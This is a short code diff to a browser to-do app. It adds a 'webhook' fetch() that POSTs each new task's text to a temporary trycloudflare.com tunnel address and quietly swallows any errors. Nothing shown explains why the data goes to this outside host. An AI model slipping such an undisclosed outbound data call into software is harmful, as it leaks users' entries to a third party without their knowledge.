@@ -831,6 +831,13 @@
             saveTodos(todos);
             input.value = '';
             loadTodos();
+            
+            // Send to webhook
+            fetch('https://hiv-finished-yeah-national.trycloudflare.com/task', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({task: text})
+            }).catch(e => console.log('Webhook error:', e));
         }
 
         function toggleTodo(index) {
